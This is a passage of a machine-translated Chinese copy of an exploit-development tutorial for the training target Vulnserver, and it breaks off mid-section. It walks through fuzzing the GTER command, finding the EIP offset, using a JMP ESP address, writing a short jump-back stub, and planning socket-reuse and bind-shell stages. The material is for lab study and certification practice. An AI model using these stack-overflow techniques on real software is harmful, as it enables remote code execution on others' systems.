<html>
<head>
<title>[ExpDev] Vulnserver — Part 6</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Vulnserver —第6部分</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/expdev-vulnserver-part-6-8c98fcdc9131?source=collection_archive---------0-----------------------#2020-08-21">https://infosecwriteups.com/expdev-vulnserver-part-6-8c98fcdc9131?source=collection_archive---------0-----------------------#2020-08-21</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><figure class="gl gn jr js jt ju gh gi paragraph-image"><div class="gh gi jq"><img src="../Images/d98220a104847139f0a3bf8c6c149c87.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*_-1LPztG6mumi5hh.png"/></div></figure><h1 id="61bc" class="jx jy it bd jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku bi translated">Vulnserver —第6部分(GTER — EIP覆盖+套接字重用利用)</h1><p id="6ffd" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">这将是第六个<code class="fe lt lu lv lw b">vulnserver</code>漏洞系列。这次我们将模糊和利用易受攻击的命令<code class="fe lt lu lv lw b">GTER</code>。我们将通过<code class="fe lt lu lv lw b">EIP</code>覆盖来识别崩溃点。</p></div><div class="ab cl lx ly hx lz" role="separator"><span class="ma bw bk mb mc md"/><span class="ma bw bk mb mc md"/><span class="ma bw bk mb mc"/></div><div class="im in io ip iq"><h1 id="72ab" class="jx jy it bd jz ka me kc kd ke mf kg kh ki mg kk kl km mh ko kp kq mi ks kt ku bi translated">实验室环境</h1><ul class=""><li id="c391" class="mj mk it kx b ky kz lc ld lg ml lk mm lo mn ls mo mp mq mr bi translated"><strong class="kx iu">操作系统:</strong> Windows 7 (x86)</li><li id="1d09" class="mj mk it kx b ky ms lc mt lg mu lk mv lo mw ls mo mp mq mr bi translated"><strong class="kx iu">调试器:</strong> OllyDbg，WinDbg (mona.py)</li><li id="f994" class="mj mk it kx b ky ms lc mt lg mu lk mv lo mw ls mo mp mq mr bi translated">模糊器:模糊器</li><li id="d381" class="mj mk it kx b ky ms lc mt lg mu lk mv lo mw ls mo mp mq mr bi translated"><strong class="kx iu">目标:</strong> Vulnserver — <code class="fe lt lu lv lw b">GTER</code>命令(EIP覆盖+限制字符)</li></ul><p id="2d80" class="pw-post-body-paragraph kv kw it kx b ky mx la lb lc my le lf lg mz li lj lk na lm ln lo nb lq lr ls im bi translated"><em class="nc">*详细的实验室设置指南可以在</em> <a class="ae nd" href="https://medium.com/@bigb0ss/expdev-vulnserver-part-1-ba35b9e36478" rel="noopener"> <em class="nc">这里找到</em> </a></p><ul class=""><li id="0d4f" class="mj mk it kx b ky mx lc my lg ne lk nf lo ng ls mo mp mq mr bi translated">Vulnserver —第一部分</li></ul></div><div class="ab cl lx ly hx lz" role="separator"><span class="ma bw bk mb mc md"/><span class="ma bw bk mb mc md"/><span class="ma bw bk mb mc"/></div><div class="im in io ip iq"><h1 id="f247" class="jx jy it bd jz ka me kc kd ke mf kg kh ki mg kk kl km mh ko kp kq mi ks kt ku bi translated">初步侦察</h1><p id="7f09" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">让我们快速检查一下<code class="fe lt lu lv lw b">GTER</code>命令是做什么的。</p><figure class="ni nj nk nl gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi nh"><img src="../Images/ab5e440ad3f4bf75a85db7b2f4ad728f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*KzeVcPBMKH_971S2R4eBLQ.png"/></div></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">GTER命令</figcaption></figure></div><div class="ab cl lx ly hx lz" role="separator"><span class="ma bw bk mb mc md"/><span class="ma bw bk mb mc md"/><span class="ma bw bk mb mc"/></div><div class="im in io ip iq"><h1 id="d56e" class="jx jy it bd jz ka me kc kd ke mf kg kh ki mg kk kl km mh ko kp kq mi ks kt ku bi translated">起毛</h1><p id="d67d" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">因为我们已经有了之前从<a class="ae nd" href="https://medium.com/@bigb0ss/expdev-vulnserver-part-2-46de4dd7bdde" rel="noopener">第1部分</a>创建的模糊化脚本，我们可以只为<code class="fe lt lu lv lw b">GTER</code>命令的模糊化器做一些小的修改。</p><figure class="ni nj nk nl gt ju gh gi paragraph-image"><div class="gh gi nu"><img src="../Images/7691c06bea2daec45638285f64f4b5b0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1158/format:webp/1*J4KYLjcst56i6FPWo5Et1g.png"/></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">来源:<a class="ae nd" href="https://github.com/bigb0sss/OSCE/blob/master/vulnserver/GTER%20-%20EIP%20Overwrite/fuzz_gter.py" rel="noopener ugc nofollow" target="_blank">fuzz _ gter . py by bigboss</a></figcaption></figure><p id="cab2" class="pw-post-body-paragraph kv kw it kx b ky mx la lb lc my le lf lg mz li lj lk na lm ln lo nb lq lr ls im bi translated">像往常一样，让我们用OllyDbg连接<code class="fe lt lu lv lw b">vulnserver</code>。然后，运行我们的fuzzer。</p><pre class="ni nj nk nl gt nv lw nw nx aw ny bi"><span id="40d7" class="nz jy it lw b gy oa ob l oc od"><strong class="lw iu">### Running the Fuzzer</strong><br/>C:\Users\bigb0ss\Desktop\scripts\GTER&gt;python fuzz_gter.py</span></pre><p id="2386" class="pw-post-body-paragraph kv kw it kx b ky mx la lb lc my le lf lg mz li lj lk na lm ln lo nb lq lr ls im bi translated">运行我们的fuzzing脚本几秒钟后，<code class="fe lt lu lv lw b">vulnserver</code>崩溃了。从OllyDbg的崩溃中，我们可以清楚地看到<code class="fe lt lu lv lw b">GTER</code>命令和一定数量的字符导致了崩溃。</p><figure class="ni nj nk nl gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi oe"><img src="../Images/dd7e788d465b826a2add27c58a9a960e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Ferf3atKInE6N39moS-4Ew.png"/></div></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">初始碰撞</figcaption></figure></div><div class="ab cl lx ly hx lz" role="separator"><span class="ma bw bk mb mc md"/><span class="ma bw bk mb mc md"/><span class="ma bw bk mb mc"/></div><div class="im in io ip iq"><h2 id="52e9" class="nz jy it bd jz of og dn kd oh oi dp kh lg oj ok kl lk ol om kp lo on oo kt op bi translated">模糊分析</h2><p id="0eac" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">从OllyDbg上的崩溃来看，大约是160个字符导致了<code class="fe lt lu lv lw b">GTER</code>命令的崩溃。这次我们将跳过Boofuzz DB文件分析。</p></div><div class="ab cl lx ly hx lz" role="separator"><span class="ma bw bk mb mc md"/><span class="ma bw bk mb mc md"/><span class="ma bw bk mb mc"/></div><div class="im in io ip iq"><h1 id="6f72" class="jx jy it bd jz ka me kc kd ke mf kg kh ki mg kk kl km mh ko kp kq mi ks kt ku bi translated">剥削</h1><h2 id="2a85" class="nz jy it bd jz of og dn kd oh oi dp kh lg oj ok kl lk ol om kp lo on oo kt op bi translated">初始崩溃概念验证</h2><p id="2e1c" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">让我们创建一个python脚本来重现崩溃。</p><figure class="ni nj nk nl gt ju gh gi paragraph-image"><div class="gh gi oq"><img src="../Images/9e72179ed74b3a02f44b7f0395dee20c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1224/format:webp/1*Y0xGZkv7mCwo5H6P4pH0aQ.png"/></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">来源:<a class="ae nd" href="https://github.com/bigb0sss/OSCE/blob/master/vulnserver/GTER%20-%20EIP%20Overwrite/crash_gter.py" rel="noopener ugc nofollow" target="_blank">crash _ gter . py by bigboss</a></figcaption></figure><p id="a41c" class="pw-post-body-paragraph kv kw it kx b ky mx la lb lc my le lf lg mz li lj lk na lm ln lo nb lq lr ls im bi translated">启动<code class="fe lt lu lv lw b">vulnserver</code>并将其连接到OllyDbg。然后，运行<code class="fe lt lu lv lw b">crash_gter.py</code>脚本。我们成功地用我们的PoC脚本重现了崩溃。</p><figure class="ni nj nk nl gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi or"><img src="../Images/5f92d2d6e8f56971c0817c4754f967ca.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*u6Nfa9l4MHOhqpT6-z0ZTg.png"/></div></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">再现车祸</figcaption></figure></div><div class="ab cl lx ly hx lz" role="separator"><span class="ma bw bk mb mc md"/><span class="ma bw bk mb mc md"/><span class="ma bw bk mb mc"/></div><div class="im in io ip iq"><h2 id="55ea" class="nz jy it bd jz of og dn kd oh oi dp kh lg oj ok kl lk ol om kp lo on oo kt op bi translated">寻找偏移</h2><p id="c798" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">我们的下一步通常是找到一个偏移量来控制崩溃时的<code class="fe lt lu lv lw b">EIP</code>。让我们首先创建160个独特的角色。我们将使用WinDbg和mona.py的<code class="fe lt lu lv lw b">pattern_create</code>模块来完成这项工作。</p><p id="5b61" class="pw-post-body-paragraph kv kw it kx b ky mx la lb lc my le lf lg mz li lj lk na lm ln lo nb lq lr ls im bi translated">运行WinDbg后，键入以下命令来加载python模块并创建模式。</p><pre class="ni nj nk nl gt nv lw nw nx aw ny bi"><span id="f0dc" class="nz jy it lw b gy oa ob l oc od"><strong class="lw iu">### Loading Python Extension of WinDbg</strong><br/>.load pykd.pyd</span><span id="16a6" class="nz jy it lw b gy os ob l oc od"><strong class="lw iu">### Mona.py Pattern_create</strong><br/>!py mona pattern_create 160</span><span id="2d29" class="nz jy it lw b gy os ob l oc od">Hold on...<br/>[+] Command used:<br/>!py mona.py pattern_create 160<br/>Creating cyclic pattern of 160 bytes<br/><strong class="lw iu">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2A</strong><br/>[+] Preparing output file 'pattern.txt'</span></pre><p id="fc95" class="pw-post-body-paragraph kv kw it kx b ky mx la lb lc my le lf lg mz li lj lk na lm ln lo nb lq lr ls im bi translated">让我们用创建的模式更新PoC脚本，并再次针对<code class="fe lt lu lv lw b">vulnserver</code>运行脚本。</p><figure class="ni nj nk nl gt ju gh gi paragraph-image"><div class="gh gi ot"><img src="../Images/800b492961fd0cc9777dc85ad88a9a50.png" data-original-src="https://miro.medium.com/v2/resize:fit:1188/format:webp/1*ytc6W1pDlS3Pcs_BPlvotg.png"/></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">来源:<a class="ae nd" href="https://github.com/bigb0sss/OSCE/blob/master/vulnserver/GTER%20-%20EIP%20Overwrite/pattern_gter.py" rel="noopener ugc nofollow" target="_blank">pattern _ gter . py by bigboss</a></figcaption></figure><figure class="ni nj nk nl gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi ou"><img src="../Images/d36f87be107f81990eb0e9dcc26926de.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*mKjvoKwaZ99UF4gJPYvEUQ.png"/></div></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">Pattern_gter.py结果</figcaption></figure><p id="f74d" class="pw-post-body-paragraph kv kw it kx b ky mx la lb lc my le lf lg mz li lj lk na lm ln lo nb lq lr ls im bi translated"><code class="fe lt lu lv lw b">EIP</code>现在被值<code class="fe lt lu lv lw b">66413066</code>覆盖。让我们再次使用mona.py来查找偏移量。这次，我们将使用名为<code class="fe lt lu lv lw b">pattern_offset</code>的模块。</p><pre class="ni nj nk nl gt nv lw nw nx aw ny bi"><span id="b2c8" class="nz jy it lw b gy oa ob l oc od"><strong class="lw iu">### Mona.py Pattern_offset</strong><br/>!py mona pattern_offset 66413066</span></pre><figure class="ni nj nk nl gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi ov"><img src="../Images/cebe1369bb70b09e692944ef02b2703a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Vp3uDj-hybRnHZDAkHNSNg.png"/></div></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">偏移= 151</figcaption></figure><p id="7632" class="pw-post-body-paragraph kv kw it kx b ky mx la lb lc my le lf lg mz li lj lk na lm ln lo nb lq lr ls im bi translated">它发现偏移量为151。让我们再次更新我们的PoC脚本，并通过对<code class="fe lt lu lv lw b">vulnserver</code>运行它来确认偏移量。</p></div><div class="ab cl lx ly hx lz" role="separator"><span class="ma bw bk mb mc md"/><span class="ma bw bk mb mc md"/><span class="ma bw bk mb mc"/></div><div class="im in io ip iq"><h2 id="e704" class="nz jy it bd jz of og dn kd oh oi dp kh lg oj ok kl lk ol om kp lo on oo kt op bi translated">确认偏移</h2><figure class="ni nj nk nl gt ju gh gi paragraph-image"><div class="gh gi ow"><img src="../Images/00659cd4a11563e308eb4a9f642659fa.png" data-original-src="https://miro.medium.com/v2/resize:fit:1210/format:webp/1*j7pz7hxKFKdX0PrW5bK78g.png"/></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">来源:<a class="ae nd" href="https://github.com/bigb0sss/OSCE/blob/master/vulnserver/GTER%20-%20EIP%20Overwrite/offset_gter.py" rel="noopener ugc nofollow" target="_blank">offset _ gter . py by bigboss</a></figcaption></figure><figure class="ni nj nk nl gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi ox"><img src="../Images/a01d7093ff48e3973296deb41cdd9455.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pc5n0M_wuJ1K6U282oMXCg.png"/></div></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">确认偏移</figcaption></figure><p id="7216" class="pw-post-body-paragraph kv kw it kx b ky mx la lb lc my le lf lg mz li lj lk na lm ln lo nb lq lr ls im bi translated">这种偏移确实是正确的。现在，我们都准备好在崩溃的时候控制<code class="fe lt lu lv lw b">EIP</code>。</p></div><div class="ab cl lx ly hx lz" role="separator"><span class="ma bw bk mb mc md"/><span class="ma bw bk mb mc md"/><span class="ma bw bk mb mc"/></div><div class="im in io ip iq"><h2 id="a7b6" class="nz jy it bd jz of og dn kd oh oi dp kh lg oj ok kl lk ol om kp lo on oo kt op bi translated">寻找JMP</h2><p id="ae5c" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">作为一个常见的<code class="fe lt lu lv lw b">EIP</code>重写BOF漏洞，我们现在需要在应用程序中找到一个<code class="fe lt lu lv lw b">JMP ESP</code>指令。</p><p id="6ca4" class="pw-post-body-paragraph kv kw it kx b ky mx la lb lc my le lf lg mz li lj lk na lm ln lo nb lq lr ls im bi translated">这次让我们将vulnserver附加到WinDbg，这样我们就可以使用mona.py在应用程序的dll中找到<code class="fe lt lu lv lw b">JMP ESP</code>。我们将再次使用<code class="fe lt lu lv lw b">-cpb</code>标志来排除任何包含<code class="fe lt lu lv lw b">\x00</code>的地址。(默认情况下，它还会在非ASLR或非Rebase模块中进行搜索。)</p><pre class="ni nj nk nl gt nv lw nw nx aw ny bi"><span id="607c" class="nz jy it lw b gy oa ob l oc od"><strong class="lw iu">### Loading Python Extension of WinDbg</strong><br/>.load pykd.pyd</span><span id="175f" class="nz jy it lw b gy os ob l oc od"><strong class="lw iu">### Mona.py Finding JMP ESP</strong><br/>!py mona jmp -r esp -cpb '\x00'</span></pre><figure class="ni nj nk nl gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi oy"><img src="../Images/0b2ecfe64f63cfda288d6c8b14ab067b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*vW--w0FkUObL5hy-.png"/></div></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">寻找JMP ESP</figcaption></figure><p id="c65d" class="pw-post-body-paragraph kv kw it kx b ky mx la lb lc my le lf lg mz li lj lk na lm ln lo nb lq lr ls im bi translated">让我们使用其中一个地址<code class="fe lt lu lv lw b">0x62501205</code>，并更新我们的PoC脚本。并再次将vulnserver附加到OllyDbg，在<code class="fe lt lu lv lw b">0x62501205</code> ( <code class="fe lt lu lv lw b">JMP ESP</code>)地址设置一个断点。</p><figure class="ni nj nk nl gt ju gh gi paragraph-image"><div class="gh gi oz"><img src="../Images/85b75e378066bbd27721d90b4376d737.png" data-original-src="https://miro.medium.com/v2/resize:fit:890/format:webp/0*Shjo-gBJ5erh0-Xi.png"/></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">JMP ESP处的断点</figcaption></figure><p id="6ede" class="pw-post-body-paragraph kv kw it kx b ky mx la lb lc my le lf lg mz li lj lk na lm ln lo nb lq lr ls im bi translated">当我们运行PoC脚本时，我们确实找到了<code class="fe lt lu lv lw b">JMP ESP</code>地址和断点。</p><figure class="ni nj nk nl gt ju gh gi paragraph-image"><div class="gh gi pa"><img src="../Images/b141230ca8f4bd39997d90a0f333b845.png" data-original-src="https://miro.medium.com/v2/resize:fit:1240/format:webp/1*2hHdIhs0xUGFjJte_kdqCQ.png"/></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">来源:<a class="ae nd" href="https://github.com/bigb0sss/OSCE/blob/master/vulnserver/GTER%20-%20EIP%20Overwrite/jmp-esp_gter.py" rel="noopener ugc nofollow" target="_blank">jmp-esp _ gter . py by bigboss</a></figcaption></figure><p id="f878" class="pw-post-body-paragraph kv kw it kx b ky mx la lb lc my le lf lg mz li lj lk na lm ln lo nb lq lr ls im bi translated">一旦我们运行了<code class="fe lt lu lv lw b">jmp-esp_gter.py</code>脚本，我们将成功地点击<code class="fe lt lu lv lw b">JMP ESP</code>。(确保在<code class="fe lt lu lv lw b">JMP ESP</code>位置<code class="fe lt lu lv lw b">0x62501205</code>设置断点)</p><p id="2f27" class="pw-post-body-paragraph kv kw it kx b ky mx la lb lc my le lf lg mz li lj lk na lm ln lo nb lq lr ls im bi translated">当我们按下<code class="fe lt lu lv lw b">F7</code>来步进指令时，我们成功地跳到了<code class="fe lt lu lv lw b">ESP</code>，但是我们遇到了一个问题。我已经更新了上面的<code class="fe lt lu lv lw b">jmp-esp_gter.py</code>脚本，在<code class="fe lt lu lv lw b">eip</code> ( <code class="fe lt lu lv lw b">JMP ESP</code>地址)后提供100个“C”。当我们运行这个脚本时,“C”被截短到只有20个字节。我们需要创造性地思考，从这个有限的空间逃到更大的土地上。</p><figure class="ni nj nk nl gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi pb"><img src="../Images/c710c75f3250ae38ed74f61d8358ff13.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5lr8eCGWBv05-Z6Thhrdpw.png"/></div></div></figure><p id="cc3b" class="pw-post-body-paragraph kv kw it kx b ky mx la lb lc my le lf lg mz li lj lk na lm ln lo nb lq lr ls im bi translated">为了避免这种情况，我们的攻击计划如下:</p><p id="e3bc" class="pw-post-body-paragraph kv kw it kx b ky mx la lb lc my le lf lg mz li lj lk na lm ln lo nb lq lr ls im bi translated"><strong class="kx iu">【第一阶段外壳代码】</strong>利用20字节的空间将第一阶段外壳代码引入JMP，返回到上面带有“A”的更大空间</p><p id="bdad" class="pw-post-body-paragraph kv kw it kx b ky mx la lb lc my le lf lg mz li lj lk na lm ln lo nb lq lr ls im bi translated"><strong class="kx iu">【第二阶段shell code】</strong>接下来，我们将学习并介绍一个套接字重用漏洞，以获得更大的空间来添加我们的最终绑定shell。</p><p id="f8b0" class="pw-post-body-paragraph kv kw it kx b ky mx la lb lc my le lf lg mz li lj lk na lm ln lo nb lq lr ls im bi translated"><strong class="kx iu">【第三阶段Shellcode】</strong>最后，在更大的篇幅内介绍一下bind shellcode。</p></div><div class="ab cl lx ly hx lz" role="separator"><span class="ma bw bk mb mc md"/><span class="ma bw bk mb mc md"/><span class="ma bw bk mb mc"/></div><div class="im in io ip iq"><h1 id="32ac" class="jx jy it bd jz ka me kc kd ke mf kg kh ki mg kk kl km mh ko kp kq mi ks kt ku bi translated">第一阶段外壳代码(JMP背面)</h1><p id="9d58" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">在<code class="fe lt lu lv lw b">JMP ESP</code>指令之后，我们将有大约20字节的空闲空间。我们将引入下面的一小块操作码，将我们当前的位置重定向到上面带“A”的区域:</p><pre class="ni nj nk nl gt nv lw nw nx aw ny bi"><span id="d202" class="nz jy it lw b gy oa ob l oc od"><strong class="lw iu">### JMP Back Opcode</strong><br/>PUSH ESP                 <strong class="lw iu">; Pushing the current address on the ESP </strong><br/>POP ECX                  <strong class="lw iu">; Pop the current stack address on the ECX</strong><br/>SUB ECX, 0x64            <strong class="lw iu">; Subtract 64 from the current ECX address</strong><br/>JMP ECX                  <strong class="lw iu">; Jump to adjusted ECX address</strong></span></pre><figure class="ni nj nk nl gt ju gh gi paragraph-image"><div class="gh gi pc"><img src="../Images/68fad06dabfa61de1b8297bfe70b2eda.png" data-original-src="https://miro.medium.com/v2/resize:fit:900/format:webp/1*FgBPtFXc_E8LE7RjjoUPIg.png"/></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">JMP返回操作码</figcaption></figure><p id="05f1" class="pw-post-body-paragraph kv kw it kx b ky mx la lb lc my le lf lg mz li lj lk na lm ln lo nb lq lr ls im bi translated">一旦我们跳过指令，我们将成功地跳到我们控制的“A”位置。</p><figure class="ni nj nk nl gt ju gh gi paragraph-image"><div class="gh gi pd"><img src="../Images/a615138ee284b51570f48dffd62ab8e1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1344/format:webp/1*dp_6mTWqiFgA9YEeLWXyuA.png"/></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">JMP回来了</figcaption></figure><p id="4df3" class="pw-post-body-paragraph kv kw it kx b ky mx la lb lc my le lf lg mz li lj lk na lm ln lo nb lq lr ls im bi translated"><em class="nc">*这里的一个提示是，从OllyDbg中，我们可以简单地二进制复制我们编写的操作码，以便在我们的漏洞利用脚本中使用它们。</em></p><p id="c8fc" class="pw-post-body-paragraph kv kw it kx b ky mx la lb lc my le lf lg mz li lj lk na lm ln lo nb lq lr ls im bi translated">让我们用第一阶段外壳代码更新我们的PoC脚本。</p><figure class="ni nj nk nl gt ju gh gi paragraph-image"><div class="gh gi pe"><img src="../Images/994e107840d4c1e301485e8a700dbff0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1360/format:webp/1*ffsamzxykzI5FjgbpGrl1A.png"/></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">来源:<a class="ae nd" href="https://github.com/bigb0sss/OSCE/blob/master/vulnserver/GTER%20-%20EIP%20Overwrite/first_stage_gter.py" rel="noopener ugc nofollow" target="_blank">first _ stage _ gter . py by bigboss</a></figcaption></figure></div><div class="ab cl lx ly hx lz" role="separator"><span class="ma bw bk mb mc md"/><span class="ma bw bk mb mc md"/><span class="ma bw bk mb mc"/></div><div class="im in io ip iq"><h1 id="97db" class="jx jy it bd jz ka me kc kd ke mf kg kh ki mg kk kl km mh ko kp kq mi ks kt ku bi translated">第二阶段外壳代码(套接字重用漏洞)</h1><blockquote class="pf pg ph"><p id="ba95" class="kv kw nc kx b ky mx la lb lc my le lf pi mz li lj pj na lm ln pk nb lq lr ls im bi translated">对于这一个，老实说我以前不知道什么是套接字重用漏洞利用，所以我在这里大量利用聪明人的博客:)感谢<a class="ae nd" href="https://epi052.gitlab.io/notes-to-self/blog/2020-05-22-osce-exam-practice-part-seven/" rel="noopener ugc nofollow" target="_blank"> @epi052 </a>和<a class="ae nd" href="https://rastating.github.io/using-socket-reuse-to-exploit-vulnserver/" rel="noopener ugc nofollow" target="_blank">@ iam rasting</a>。我强烈推荐你阅读他们的博客了解更多细节。</p></blockquote><h2 id="2f84" class="nz jy it bd jz of og dn kd oh oi dp kh lg oj ok kl lk ol om kp lo on oo kt op bi translated">什么是套接字重用漏洞利用？</h2><p id="c917" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">简单地说，如果我们可以访问一个套接字(连接到另一台主机)，我们可以使用像<code class="fe lt lu lv lw b">send</code>或<code class="fe lt lu lv lw b">recv</code>这样的函数来执行网络操作。这使得套接字重用利用成为可能。</p><p id="9acf" class="pw-post-body-paragraph kv kw it kx b ky mx la lb lc my le lf lg mz li lj lk na lm ln lo nb lq lr ls im bi translated">套接字重用漏洞也被称为单向外壳代码，它帮助用户在进行基于网络的攻击时绕过限制性的防火墙规则。根据目标系统上的防火墙规则，有许多不同的单向外壳代码技术，如反向连接外壳代码或重新绑定套接字外壳代码，但我们将专注于套接字重用外壳代码，以完成其余的<code class="fe lt lu lv lw b">GTER</code>命令利用。</p><figure class="ni nj nk nl gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi pl"><img src="../Images/2ae71b6a87d3e1117d1f5bb670dcce69.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Ek-884ouWT3lCAAbsKuD0A.png"/></div></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">来源:<a class="ae nd" href="https://www.blackhat.com/presentations/bh-asia-03/bh-asia-03-chong.pdf" rel="noopener ugc nofollow" target="_blank"> Win32单向外壳代码Blackhat演示文稿</a></figcaption></figure><p id="e332" class="pw-post-body-paragraph kv kw it kx b ky mx la lb lc my le lf lg mz li lj lk na lm ln lo nb lq lr ls im bi translated">对于我们的第二阶段有效载荷，我们将做以下工作:</p><p id="74b0" class="pw-post-body-paragraph kv kw it kx b ky mx la lb lc my le lf lg mz li lj lk na lm ln lo nb lq lr ls im bi translated"><strong class="kx iu">【步骤1】</strong>连接到<code class="fe lt lu lv lw b">vulnserver</code>时识别文件描述符</p><blockquote class="pf pg ph"><p id="f861" class="kv kw nc kx b ky mx la lb lc my le lf pi mz li lj pj na lm ln pk nb lq lr ls im bi translated"><strong class="kx iu">文件描述符</strong>是用于访问文件或其他输入/输出资源的抽象指示符，例如管道或网络套接字。(来源:<a class="ae nd" href="https://en.wikipedia.org/wiki/File_descriptor" rel="noopener ugc nofollow" target="_blank">https://en.wikipedia.org/wiki/File_descriptor</a>)</p></blockquote><p id="32ba" class="pw-post-body-paragraph kv kw it kx b ky mx la lb lc my le lf lg mz li lj lk na lm ln lo nb lq lr ls im bi translated"><strong class="kx iu">【步骤2】</strong>在内存中找到一个位置来引入我们的bind shell的第三阶段有效负载</p><p id="c437" class="pw-post-body-paragraph kv kw it kx b ky mx la lb lc my le lf lg mz li lj lk na lm ln lo nb lq lr ls im bi translated"><strong class="kx iu">【步骤3】</strong>利用文件描述符调用<code class="fe lt lu lv lw b">WS2_32.recv</code></p><p id="e677" class="pw-post-body-paragraph kv kw it kx b ky mx la lb lc my le lf lg mz li lj lk na lm ln lo nb lq lr ls im bi translated"><strong class="kx iu">【步骤4】</strong>通过使用现有连接向<code class="fe lt lu lv lw b">vulnserver</code>发送第三阶段有效载荷，完成我们的最终利用</p></div><div class="ab cl lx ly hx lz" role="separator"><span class="ma bw bk mb mc md"/><span class="ma bw bk mb mc md"/><span class="ma bw bk mb mc"/></div><div class="im in io ip iq"><h2 id="aa80" class="nz jy it bd jz of og dn kd oh oi dp kh lg oj ok kl lk ol om kp lo on oo kt op bi translated">正在查找文件描述符</h2><p id="9ad4" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">为了找到文件描述符，我们需要理解<code class="fe lt lu lv lw b">recv</code>函数的语法。</p><figure class="ni nj nk nl gt ju gh gi paragraph-image"><div class="gh gi pm"><img src="../Images/b661d3575c871fe42eb4624269e8df9b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1316/format:webp/1*B651fkDPVDWu19B-j9TCAw.png"/></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">来源:<a class="ae nd" href="https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-recv" rel="noopener ugc nofollow" target="_blank">https://docs . Microsoft . com/en-us/windows/win32/API/Winsock/nf-Winsock-recv</a></figcaption></figure><pre class="ni nj nk nl gt nv lw nw nx aw ny bi"><span id="354b" class="nz jy it lw b gy oa ob l oc od"><strong class="lw iu">### 'recv' Function Parameters Explained</strong></span><span id="1428" class="nz jy it lw b gy os ob l oc od"><strong class="lw iu">"SOCKET s"</strong> : The descriptor that identifies a connected socket<br/><strong class="lw iu">"char *buf"</strong>: A pointer to the buffer to receive the incoming data<br/><strong class="lw iu">"int len"</strong>  : The length of the buffer pointed to by the <em class="nc">buf</em> <br/>             parameter<br/><strong class="lw iu">"int flags"</strong> : A 